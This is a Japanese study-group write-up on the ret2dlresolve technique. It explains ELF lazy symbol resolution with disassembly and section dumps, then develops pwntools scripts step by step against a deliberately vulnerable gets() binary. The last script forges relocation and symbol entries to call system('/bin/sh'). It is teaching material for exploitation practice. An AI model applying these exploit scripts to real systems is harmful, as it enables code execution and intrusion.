###### tags: `少しkatagaitai勉強会`
# ret2dlresolve復習
## 概要
昨今の多くのPwn問題では大体サーバ上で動いているlibc（ライブラリ）が渡されるため、そのオフセットを調べることで、libcのベースやsystem関数のアドレスを調べることができる。
しかし、リアルワールドではライブラリが配布されることはないし、CTFの問題としてもたまにlibcが配布されない問題が散見される。

ret2dlresolveはライブラリの関数アドレス解決機構の仕組みを悪用することで、ライブラリの情報が手元にない状況においても任意のライブラリ関数を呼び出すことが可能となる手法。

## ELF Relocationの仕組み
フロー概要
![image](https://hackmd.io/_uploads/ry1hgYs3p.png)
もうちょっと詳しく書くと以下のようになる。
```
call hogehoge@plt
　　　┗ plt.secセクションへジャンプ
        endbr64
        bnd jmp hogehoge@.plt
        ┗ .pltセクションへジャンプ
                endbr64
                push reloc_arg(関数毎に異なる整数値)
                bnd  jmp .pltセクションの先頭
                    ┗ .pltセクション(の先頭)
                        push binaryのlink_map
                        bnd jmp _dl_runtime_resolve_xsavec
                            ┗ _dl_fixup(link_map, reloc_arg) <-解決したシンボルのアドレスを返す. 
                                ┗ _dl_lookup_symbol_x　<- 実際にシンボル解決を行っている関数. 
```
https://hackmd.io/@1u991yuz4k1/ByZM7VMPo

### PLT/GOT周りの処理
`puts`のPLTエントリを見てみると、速攻でGOTエントリ`0x404018`にジャンプしていることがわかる。
アドレス解決後はこのGOT内にlibc内のアドレスが格納されるためそのままライブラリ関数の実態にジャンプできる。
```
> objdump -d -j.plt.sec chall

chall:     file format elf64-x86-64


Disassembly of section .plt.sec:

0000000000401060 <puts@plt>:
  401060:       f3 0f 1e fa             endbr64
  401064:       f2 ff 25 ad 2f 00 00    bnd jmp *0x2fad(%rip)        # 404018 <puts@GLIBC_2.2.5>
  40106b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
```

GOTエントリを見てみる。
```
> objdump -d -j.got.plt chall

chall:     file format elf64-x86-64


Disassembly of section .got.plt:

0000000000404000 <_GLOBAL_OFFSET_TABLE_>:
  404000:       20 3e 40 00 00 00 00 00 00 00 00 00 00 00 00 00      >@.............
        ...
  404018:       30 10 40 00 00 00 00 00 40 10 40 00 00 00 00 00     0.@.....@.@.....
  404028:       50 10 40 00 00 00 00 00                             P.@.....
```
リロケーション前は`.plt`セクション内のアドレス`0x401030`が格納されている。のでそちらにジャンプする。
　※ビッグエンディアンになっている点に注意。

```
> objdump -d -j.plt chall

chall:     file format elf64-x86-64


Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 e2 2f 00 00       push   0x2fe2(%rip)        # 404008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 e3 2f 00 00    bnd jmp *0x2fe3(%rip)        # 404010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nopl   (%rax)
  401030:       f3 0f 1e fa             endbr64
  401034:       68 00 00 00 00          push   $0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <.plt>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64
  401044:       68 01 00 00 00          push   $0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <.plt>
  40104f:       90                      nop
  401050:       f3 0f 1e fa             endbr64
  401054:       68 02 00 00 00          push   $0x2
  401059:       f2 e9 c1 ff ff ff       bnd jmp 401020 <.plt>
  40105f:       90                      nop
```

`0x401030`からの処理を見てみると、`0x0`をスタックにpushして速攻PLTセクションの先頭にジャンプしていることがわかる。この`0x0`は**reloc_arg**と呼ばれるもので、呼び出す関数ごとに固有の値が振られている。
今回のバイナリの場合以下の割り当てとなる。
* puts : 0x0
* gets : 0x1
* exit : 0x2

そしてその後、`0x404008`をスタックにプッシュした後、`0x404010`に格納されているアドレスへまた更にジャンプしていることがわかる。

なお、この`0x404008`に格納されているのは`link_map`と呼ばれる構造体で、`0x404010`に格納されているのはlibc内の`_dl_runtime_resolve_xsavec`という関数である。

```
gef> x/4gx 0x404010
0x404010:       0x00007ffff7fd8d30      0x0000000000401030
0x404020 <gets@got[plt]>:       0x00007ffff7e0b520      0x0000000000401050
gef> x/32i 0x00007ffff7fd8d30
   0x7ffff7fd8d30 <_dl_runtime_resolve_xsavec>: endbr64
   0x7ffff7fd8d34 <_dl_runtime_resolve_xsavec+4>:       push   rbx
   0x7ffff7fd8d35 <_dl_runtime_resolve_xsavec+5>:       mov    rbx,rsp
   0x7ffff7fd8d38 <_dl_runtime_resolve_xsavec+8>:       and    rsp,0xffffffffffffffc0
   0x7ffff7fd8d3c <_dl_runtime_resolve_xsavec+12>:      sub    rsp,QWORD PTR [rip+0x23f4d]
```
　※`link_map`構造体の中身については後述
 
 つまり、ここまでの処理は`puts`に割り当てられた`reloc_arg`と、`link_map`構造体のアドレスをスタックに格納して`_dl_runtime_resolve_xsavec`にジャンプしていることがわかる。
 
### _dl_runtime_resolve_xsavec => _dl_fixup => _dl_lookup_symbol_xの処理
```asm
gef> disassemble _dl_runtime_resolve_xsavec
Dump of assembler code for function _dl_runtime_resolve_xsavec:
   0x00007ffff7fd8d30 <+0>:     endbr64
   0x00007ffff7fd8d34 <+4>:     push   rbx
   0x00007ffff7fd8d35 <+5>:     mov    rbx,rsp
   0x00007ffff7fd8d38 <+8>:     and    rsp,0xffffffffffffffc0
   0x00007ffff7fd8d3c <+12>:    sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 <_rtld_global_ro+432>
   0x00007ffff7fd8d43 <+19>:    mov    QWORD PTR [rsp],rax
   0x00007ffff7fd8d47 <+23>:    mov    QWORD PTR [rsp+0x8],rcx
   0x00007ffff7fd8d4c <+28>:    mov    QWORD PTR [rsp+0x10],rdx
   0x00007ffff7fd8d51 <+33>:    mov    QWORD PTR [rsp+0x18],rsi
   0x00007ffff7fd8d56 <+38>:    mov    QWORD PTR [rsp+0x20],rdi
   0x00007ffff7fd8d5b <+43>:    mov    QWORD PTR [rsp+0x28],r8
   0x00007ffff7fd8d60 <+48>:    mov    QWORD PTR [rsp+0x30],r9
   0x00007ffff7fd8d65 <+53>:    mov    eax,0xee
   0x00007ffff7fd8d6a <+58>:    xor    edx,edx
   0x00007ffff7fd8d6c <+60>:    mov    QWORD PTR [rsp+0x250],rdx
   0x00007ffff7fd8d74 <+68>:    mov    QWORD PTR [rsp+0x258],rdx
   0x00007ffff7fd8d7c <+76>:    mov    QWORD PTR [rsp+0x260],rdx
   0x00007ffff7fd8d84 <+84>:    mov    QWORD PTR [rsp+0x268],rdx
   0x00007ffff7fd8d8c <+92>:    mov    QWORD PTR [rsp+0x270],rdx
   0x00007ffff7fd8d94 <+100>:   mov    QWORD PTR [rsp+0x278],rdx
   0x00007ffff7fd8d9c <+108>:   xsavec [rsp+0x40]
   0x00007ffff7fd8da1 <+113>:   mov    rsi,QWORD PTR [rbx+0x10]
   0x00007ffff7fd8da5 <+117>:   mov    rdi,QWORD PTR [rbx+0x8]
   0x00007ffff7fd8da9 <+121>:   call   0x7ffff7fd5e70 <_dl_fixup>
   0x00007ffff7fd8dae <+126>:   mov    r11,rax
   0x00007ffff7fd8db1 <+129>:   mov    eax,0xee
   0x00007ffff7fd8db6 <+134>:   xor    edx,edx
   0x00007ffff7fd8db8 <+136>:   xrstor [rsp+0x40]
   0x00007ffff7fd8dbd <+141>:   mov    r9,QWORD PTR [rsp+0x30]
   0x00007ffff7fd8dc2 <+146>:   mov    r8,QWORD PTR [rsp+0x28]
   0x00007ffff7fd8dc7 <+151>:   mov    rdi,QWORD PTR [rsp+0x20]
   0x00007ffff7fd8dcc <+156>:   mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7fd8dd1 <+161>:   mov    rdx,QWORD PTR [rsp+0x10]
   0x00007ffff7fd8dd6 <+166>:   mov    rcx,QWORD PTR [rsp+0x8]
   0x00007ffff7fd8ddb <+171>:   mov    rax,QWORD PTR [rsp]
   0x00007ffff7fd8ddf <+175>:   mov    rsp,rbx
   0x00007ffff7fd8de2 <+178>:   mov    rbx,QWORD PTR [rsp]
   0x00007ffff7fd8de6 <+182>:   add    rsp,0x18
   0x00007ffff7fd8dea <+186>:   jmp    r11
```

大事な部分はここ。
```asm
   0x00007ffff7fd8da1 <+113>:   mov    rsi,QWORD PTR [rbx+0x10]
   0x00007ffff7fd8da5 <+117>:   mov    rdi,QWORD PTR [rbx+0x8]
   0x00007ffff7fd8da9 <+121>:   call   0x7ffff7fd5e70 <_dl_fixup>
```

この時点でrbxにはPLT/GOT周りでいじくってたスタックのアドレスが格納されているので、つまりは先ほどスタックに積んだ`link_map`と`reloc_arg`を引数に`_dl_fixup`関数を読んでいることがわかる。

そして最終的なアドレス解決を行っているのは`_dl_fixup`関数から呼ばれる`_dl_lookup_symbol_x`関数となる。
```c=
result = _dl_lookup_symbol_x (
    strtab + sym->st_name, // シンボル名の文字列のアドレス。
    l,                     // 現在検索を行っているオブジェクトのlink_map。
    &sym,                  
    l->l_scope,            
    version,               
    ELF_RTYPE_CLASS_PLT,   
    flags,                 
    NULL
);
```
https://elixir.bootlin.com/glibc/glibc-2.39.9000/source/elf/dl-runtime.c#L95

具体的にどの関数のアドレスが解決されるかはあくまで第1引数の`strtab + sym->st_name`に格納された文字列に依存する。つまりは、こいつさえ偽装できれば任意の関数を呼び出すことが可能となる。

### 呼び出し関数名の文字列解決
アドレス解決を行う関数名の文字列解決には以下の３つのセクション内のデータ深くかかわっている。
* .rela.plt
* .dynsym
* .dynstr

```
> readelf -S chall
There are 31 section headers, starting at offset 0x39b8:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.pr[...] NOTE             0000000000400338  00000338
       0000000000000020  0000000000000000   A       0     0     8
  [ 3] .note.gnu.bu[...] NOTE             0000000000400358  00000358
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .note.ABI-tag     NOTE             000000000040037c  0000037c
       0000000000000020  0000000000000000   A       0     0     4
  [ 5] .gnu.hash         GNU_HASH         00000000004003a0  000003a0
       000000000000001c  0000000000000000   A       6     0     8
  [ 6] .dynsym           DYNSYM           00000000004003c0  000003c0
       0000000000000090  0000000000000018   A       7     1     8
  [ 7] .dynstr           STRTAB           0000000000400450  00000450
       0000000000000047  0000000000000000   A       0     0     1
  [ 8] .gnu.version      VERSYM           0000000000400498  00000498
       000000000000000c  0000000000000002   A       6     0     2
  [ 9] .gnu.version_r    VERNEED          00000000004004a8  000004a8
       0000000000000020  0000000000000000   A       7     1     8
  [10] .rela.dyn         RELA             00000000004004c8  000004c8
       0000000000000030  0000000000000018   A       6     0     8
  [11] .rela.plt         RELA             00000000004004f8  000004f8
       0000000000000048  0000000000000018  AI       6    24     8
  [12] .init             PROGBITS         0000000000401000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [13] .plt              PROGBITS         0000000000401020  00001020
       0000000000000040  0000000000000010  AX       0     0     16
  [14] .plt.sec          PROGBITS         0000000000401060  00001060
       0000000000000030  0000000000000010  AX       0     0     16
  [15] .text             PROGBITS         0000000000401090  00001090
       00000000000001b5  0000000000000000  AX       0     0     16
  [16] .fini             PROGBITS         0000000000401248  00001248
       000000000000000d  0000000000000000  AX       0     0     4
  [17] .rodata           PROGBITS         0000000000402000  00002000
       000000000000000d  0000000000000000   A       0     0     4
  [18] .eh_frame_hdr     PROGBITS         0000000000402010  00002010
       000000000000004c  0000000000000000   A       0     0     4
  [19] .eh_frame         PROGBITS         0000000000402060  00002060
       0000000000000120  0000000000000000   A       0     0     8
  [20] .init_array       INIT_ARRAY       0000000000403e10  00002e10
       0000000000000008  0000000000000008  WA       0     0     8
  [21] .fini_array       FINI_ARRAY       0000000000403e18  00002e18
       0000000000000008  0000000000000008  WA       0     0     8
  [22] .dynamic          DYNAMIC          0000000000403e20  00002e20
       00000000000001d0  0000000000000010  WA       7     0     8
  [23] .got              PROGBITS         0000000000403ff0  00002ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [24] .got.plt          PROGBITS         0000000000404000  00003000
       0000000000000030  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000404030  00003030
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000404040  00003040
       0000000000000008  0000000000000000  WA       0     0     1
  [27] .comment          PROGBITS         0000000000000000  00003040
       000000000000002b  0000000000000001  MS       0     0     1
  [28] .symtab           SYMTAB           0000000000000000  00003070
       0000000000000630  0000000000000018          29    45     8
  [29] .strtab           STRTAB           0000000000000000  000036a0
       00000000000001f2  0000000000000000           0     0     1
  [30] .shstrtab         STRTAB           0000000000000000  00003892
       000000000000011f  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
```

まず、`.rela.plt`セクションには関数ごとに以下の`Elf64_Rela`構造体のデータ`reloc`が格納されている。
```c
type = struct {
    Elf64_Addr r_offset;   // 解決したアドレスの格納先＝GOT
    Elf64_Xword r_info;    // この後参照する.dynsym内のオフセットと、フラグ
    Elf64_Sxword r_addend;
}
```

セクション内の具体的にどのデータを参照すべきかは、序盤に出てきた`reloc_arg`をもとにオフセットを算出しており、`reloc_arg * 0x18`のオフセットの位置の`Elf64_Rela`構造体を参照する。

```
> objdump -s -j.rela.plt chall

chall:     file format elf64-x86-64

Contents of section .rela.plt:
 4004f8 18404000 00000000 07000000 01000000  .@@.............
 400508 00000000 00000000 20404000 00000000  ........ @@.....
 400518 07000000 04000000 00000000 00000000  ................
 400528 28404000 00000000 07000000 05000000  (@@.............
 400538 00000000 00000000
```
具体的に`puts`についてみてみると、`reloc_arg = 0`であり、オフセット0に該当するデータの`reloc->r_offset`がちゃんと`puts`のGOTであることがわかる。
また、次に参照する`.dynsym`内のオフセットが`1`であることがわかる。（07000000はフラグかなんか）

続いて、実行ファイルの.dynsymセクションにあるElf64_Sym構造体の配列を参照し、`reloc->r_info >> 32`番目の要素`sym`を見る。
```c
type = struct {
    Elf64_Word st_name;    \\ この後参照する.dynsymセクション内のオフセット
    unsigned char st_info;
    unsigned char st_other;
    Elf64_Section st_shndx;
    Elf64_Addr st_value;
    Elf64_Xword st_size;
}
```
`.dynsym`セクションをダンプしたデータが以下の通り。
```
> objdump -s -j.dynsym chall

chall:     file format elf64-x86-64

Contents of section .dynsym:
 4003c0 00000000 00000000 00000000 00000000  ................
 4003d0 00000000 00000000 15000000 12000000  ................
 4003e0 00000000 00000000 00000000 00000000  ................
 4003f0 1a000000 12000000 00000000 00000000  ................
 400400 00000000 00000000 38000000 20000000  ........8... ...
 400410 00000000 00000000 00000000 00000000  ................
 400420 0b000000 12000000 00000000 00000000  ................
 400430 00000000 00000000 10000000 12000000  ................
 400440 00000000 00000000 00000000 00000000  ................
```
今回`reloc->r_info >> 32`が1、`ELf64_Dyn`のサイズが0x18なので、`sym->st_name`は`0x15`であることがわかる。

最後に、`.dynstr`セクション内の`sym->st_name`オフセットにある文字列を参照すると、解決したい関数名の文字列、今回の場合は`puts`が格納されていることがわかる。
```
> objdump -s -j.dynstr chall

chall:     file format elf64-x86-64

Contents of section .dynstr:
 400450 006c6962 632e736f 2e360067 65747300  .libc.so.6.gets.
 400460 65786974 00707574 73005f5f 6c696263  exit.puts.__libc
 400470 5f737461 72745f6d 61696e00 474c4942  _start_main.GLIB
 400480 435f322e 322e3500 5f5f676d 6f6e5f73  C_2.2.5.__gmon_s
 400490 74617274 5f5f00                      tart__.
```

そしてこの文字列のアドレス`strtab + sym->st_name`がまさに`_dl_lookup_symbol_x`に第１引数として渡されていた文字列のアドレスとなる。

## 攻略方法
これまでの処理を逆算して考えると、以下の流れで任意の関数を呼び出せることがわかる。
1. 呼び出したい関数名の文字列`fake_str`をどこかしらに書き込む。
2. `.dynstr`の先頭から`fake_str`までのオフセットを格納した偽の`Elf64_sym`構造体`fake_sym`をどこかしらに書き込む。
3. `.dynsym`の先頭から`fake_sym`までのオフセットを0x18で割った値を格納した偽の`Elf64_Rela`構造体`fake_rela`をどこかしらに書き込む。
4. `.rela.plt`の先頭から`fake_rela`までのオフセットを0x18で割った値を`fake_reloc_arg`としてスタックに積んだ状態で`plt_start`にジャンプする。


## Step by Stepで見ていきましょう
### exploit対象のバイナリ
```c=
/* bof.cd */
#include <stdio.h>
#include <stdlib.h>

void vuln()
{
    char buf[100];
    gets(buf);
    puts(buf);
    puts("[*] Done");
}

void main(void)
{
    vuln();
    exit(0);
}
```

セキュリティ機構
* SSP無効
* PIE無効
* Partial RELRO

### ret 2 PLT
まずはシンプルなret2pltで`puts`を呼び出し`/bin/sh\x00`を表示する。

```python=
#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_bss = elf.bss()

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 
# addr_leave_ret = rop.find_gadget(["leave", "ret"])

stack_size = 0x800
base_stage = addr_bss + stack_size

target = process("./chall")

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_puts)
buf += p64(addr_plt_exit)

_ = input()
target.sendline(buf)
target.sendline(b"/bin/sh\x00")

target.interactive()
```

### reloc_argを指定したputsの呼び出し
変更ポイント：
* とび先を`puts@plt`からpltセクションの先頭に変更
* 飛ぶ直前に`puts`の`reloc_arg = 2`をスタックに積んでいる。

```python=
#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_bss = elf.bss()

addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
# addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 
# addr_leave_ret = rop.find_gadget(["leave", "ret"])

stack_size = 0x800
base_stage = addr_bss + stack_size

puts_reloc_arg = 0x0

target = process("./chall")

print("[*] .plt start : 0x{:x}".format(addr_plt_start))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
# buf += p64(addr_plt_puts)
buf += p64(addr_plt_start)
buf += p64(puts_reloc_arg)
buf += p64(addr_plt_exit)


_ = input()
target.sendline(buf)
target.sendline(b"/bin/sh\x00")

target.interactive()
```

### 偽のElf64_rela構造体を用いたputsの呼び出し
変更ポイント：
* `0x1 << 32 | 0x7`を`r_info`としてセットした偽の`ELf64_rela`構造体を用意。
* スタックに積む`reloc_arg`を、`.rela.plt`セクションから偽の`ELf64_rela`構造体までのオフセットを0x18で割った値に変更。

```python=
#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)
target = process("./chall")

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_got_gets = elf.got["gets"]
addr_bss = elf.bss()

addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 

stack_size = 0x800
base_stage = addr_bss + stack_size

# fake rela.plt
fake_rela_offset = (base_stage + 0x10) - addr_rela_plt
fake_rela_align = 0x18 - (fake_rela_offset % 0x18)
fake_rela_offset += fake_rela_align

fake_rela = p64(addr_got_gets)       # r_offset
fake_rela += p64(0x1 << 32 | 0x7)
fake_rela += p64(0x0)

puts_reloc_arg = fake_rela_offset // 0x18

print("[*] addr .plt start : 0x{:x}".format(addr_plt_start))
print("[*] addr .rela.plt start : 0x{:x}".format(addr_rela_plt))

print("[*] addr fake rela : 0x{:x}".format(base_stage + 0x10))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
# buf += p64(addr_plt_puts)
buf += p64(addr_plt_start)
buf += p64(puts_reloc_arg)
buf += p64(addr_plt_exit)

_ = input()
target.sendline(buf)
target.sendline(b"/bin/sh\x00" + p64(0x0) + b"B" * fake_rela_align + fake_rela)

target.interactive()
```

### 偽のELf64_sym構造体を用いたputsの呼び出し
変更ポイント：
* `puts`の`.dynstr`セクション内でのオフセットを`st_name`としてセットした偽の`Elf64_sym`構造体を用意。
* `.dynsym`セクションの先頭から偽の`Elf64_sym`までのオフセットを0x18で割った値を`r_info`としてセットした偽の`ELf64_rela`構造体を用意。
* スタックに積む`reloc_arg`を、`.rela.plt`セクションから偽の`ELf64_rela`構造体までのオフセットを0x18で割った値に変更。

```python=
#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)
target = process("./chall")

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_got_gets = elf.got["gets"]
addr_bss = elf.bss()

# section
addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
addr_dynsym = elf.get_section_by_name(".dynsym").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
# addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 

stack_size = 0x800
base_stage = addr_bss + stack_size

# fake rela.plt
fake_rela_offset = (base_stage + 0x10) - addr_rela_plt
fake_rela_align = 0x18 - (fake_rela_offset % 0x18)
fake_rela_offset += fake_rela_align

puts_reloc_arg = fake_rela_offset // 0x18

# fake .dynsym
fake_sym_offset = (base_stage + 0x10 + fake_rela_align + 0x18) - addr_dynsym
fake_sym_align = 0x18 - (fake_sym_offset % 0x18)
fake_sym_offset += fake_sym_align

# fake sym
fake_sym = p32(0x15)        # st_name
fake_sym += p32(0x12)       # st_info, st_other, st_shndx
fake_sym += p64(0x0)        # st_value
fake_sym += p64(0x0)        # st_size

# fake rela
fake_rela = p64(addr_got_gets)          # r_offset
fake_rela += p64((fake_sym_offset // 0x18) << 32 | 0x7)       # r_info
fake_rela += p64(0x0)                   # r_addend

print("[*] addr .plt start : 0x{:x}".format(addr_plt_start))
print("[*] addr .rela.plt start : 0x{:x}".format(addr_rela_plt))
print("[*] addr .dynsym start : 0x{:x}".format(addr_dynsym))

print("[*] addr fake puts_rela : 0x{:x}".format(base_stage + 0x10))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
# buf += p64(addr_plt_puts)
buf += p64(addr_plt_start)
buf += p64(puts_reloc_arg)
buf += p64(addr_plt_exit)

buf2 = b"/bin/sh\x00"
buf2 += p64(0x0)
buf2 += b"B" * fake_rela_align
buf2 += fake_rela
buf2 += b"C" * fake_sym_align
buf2 += fake_sym

_ = input()
target.sendline(buf)
target.sendline(buf2)

target.interactive()
```

### 偽の.dynstrセクションを用いたputsの呼び出し
* `puts\x00`の文字列を適当な位置に書き込む。
* `.dynstr`セクションの先頭から書き込んだ`puts\x00`までのオフセットを`st_name`としてセットした偽の`Elf64_sym`構造体を用意。
* `.dynsym`セクションの先頭から偽の`Elf64_sym`までのオフセットを0x18で割った値を`r_info`としてセットした偽の`ELf64_rela`構造体を用意。
* スタックに積む`reloc_arg`を、`.rela.plt`セクションから偽の`ELf64_rela`構造体までのオフセットを0x18で割った値に変更。

```pytyon=
#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)
target = process("./chall")

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_got_gets = elf.got["gets"]
addr_bss = elf.bss()

# section
addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
addr_dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
addr_dynstr = elf.get_section_by_name(".dynstr").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
# addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 

stack_size = 0x800
base_stage = addr_bss + stack_size

# fake rela.plt
fake_rela_offset = (base_stage + 0x10) - addr_rela_plt
fake_rela_align = 0x18 - (fake_rela_offset % 0x18)
fake_rela_offset += fake_rela_align

puts_reloc_arg = fake_rela_offset // 0x18

# fake .dynsym
fake_sym_offset = (base_stage + 0x10 + fake_rela_align + 0x18) - addr_dynsym
fake_sym_align = 0x18 - (fake_sym_offset % 0x18)
fake_sym_offset += fake_sym_align

# fake rela
fake_rela = p64(addr_got_gets)          # r_offset
fake_rela += p64((fake_sym_offset // 0x18) << 32 | 0x7)       # r_info
fake_rela += p64(0x0)                   # r_addend

# fake .dynstr
fake_str_offset = (base_stage + 0x10 + fake_rela_align + len(fake_rela) + fake_sym_align + 0x18) - addr_dynstr

# fake str
fake_str = b"puts\x00"

# fake sym
fake_sym = p32(fake_str_offset)        # st_name
fake_sym += p32(0x12)       # st_info, st_other, st_shndx
fake_sym += p64(0x0)        # st_value
fake_sym += p64(0x0)        # st_size

print("[*] addr .plt start : 0x{:x}".format(addr_plt_start))
print("[*] addr .rela.plt start : 0x{:x}".format(addr_rela_plt))
print("[*] addr .dynsym start : 0x{:x}".format(addr_dynsym))
print("[*] addr .dynstr start : 0x{:x}".format(addr_dynstr))

print("[*] addr fake puts_rela : 0x{:x}".format(base_stage + 0x10))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
# buf += p64(addr_plt_puts)
buf += p64(addr_plt_start)
buf += p64(puts_reloc_arg)
buf += p64(addr_plt_exit)

buf2 = b"/bin/sh\x00"
buf2 += p64(0x0)
buf2 += b"B" * fake_rela_align
buf2 += fake_rela
buf2 += b"C" * fake_sym_align
buf2 += fake_sym
buf2 += fake_str

_ = input()
target.sendline(buf)
target.sendline(buf2)

target.interactive()
```

### puts\x00 => system\x00に変更
system関数が呼ばれる。

```python=
#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)
target = process("./chall")

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_got_gets = elf.got["gets"]
addr_bss = elf.bss()

# section
addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
addr_dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
addr_dynstr = elf.get_section_by_name(".dynstr").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
addr_ret = rop.find_gadget(["ret"]).address
# addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 

stack_size = 0x800
base_stage = addr_bss + stack_size

# fake rela.plt
fake_rela_offset = (base_stage + 0x10) - addr_rela_plt
fake_rela_align = 0x18 - (fake_rela_offset % 0x18)
fake_rela_offset += fake_rela_align

puts_reloc_arg = fake_rela_offset // 0x18

# fake .dynsym
fake_sym_offset = (base_stage + 0x10 + fake_rela_align + 0x18) - addr_dynsym
fake_sym_align = 0x18 - (fake_sym_offset % 0x18)
fake_sym_offset += fake_sym_align

# fake rela
fake_rela = p64(addr_got_gets)          # r_offset
fake_rela += p64((fake_sym_offset // 0x18) << 32 | 0x7)       # r_info
fake_rela += p64(0x0)                   # r_addend

# fake .dynstr
fake_str_offset = (base_stage + 0x10 + fake_rela_align + len(fake_rela) + fake_sym_align + 0x18) - addr_dynstr

# fake str
fake_str = b"system\x00"

# fake sym
fake_sym = p32(fake_str_offset)        # st_name
fake_sym += p32(0x12)       # st_info, st_other, st_shndx
fake_sym += p64(0x0)        # st_value
fake_sym += p64(0x0)        # st_size

print("[*] addr .plt start : 0x{:x}".format(addr_plt_start))
print("[*] addr .rela.plt start : 0x{:x}".format(addr_rela_plt))
print("[*] addr .dynsym start : 0x{:x}".format(addr_dynsym))
print("[*] addr .dynstr start : 0x{:x}".format(addr_dynstr))

print("[*] addr fake puts_rela : 0x{:x}".format(base_stage + 0x10))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_ret)
buf += p64(addr_plt_start)
buf += p64(puts_reloc_arg)
buf += p64(addr_plt_exit)

buf2 = b"/bin/sh\x00"
buf2 += p64(0x0)
buf2 += b"B" * fake_rela_align
buf2 += fake_rela
buf2 += b"C" * fake_sym_align
buf2 += fake_sym
buf2 += fake_str

_ = input()
target.sendline(buf)
target.sendline(buf2)

target.interactive()
```
